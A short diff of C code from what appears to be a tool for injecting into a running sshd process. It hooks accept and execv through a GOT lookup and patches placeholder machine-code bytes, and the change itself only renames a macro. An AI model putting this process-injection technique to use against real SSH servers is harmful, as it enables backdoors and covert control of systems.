@@ -29,14 +29,14 @@
 #define ACCEPT_HOOK_OFFSET 0x0
 #define EXECV_HOOK_OFFSET 0x21b
 
-#define MOV_RAX_CALL "\x48\xB8\xF0\xDE\xBC\x9A\x78\x56\x34\x12\xFF\xD0"
+#define CALL_EXECV "\x48\xB8\xF0\xDE\xBC\x9A\x78\x56\x34\x12\xFF\xD0"
 #define MOV_RAX "\x48\xB8\xEF\xCD\xAB\x89\x67\x45\x23\x01"
 
 // replace the place_holder to the bytes I need
 void
 preprocess_code (uint32_t pid, uint64_t sshd_base)
 {
-  char *mov_rax_call = MOV_RAX_CALL;
+  char *mov_rax_call = CALL_EXECV;
 
   uint64_t execv_got = sshd_base + get_got_offset (SSHD_PATH, "execv");
   uint64_t execv;
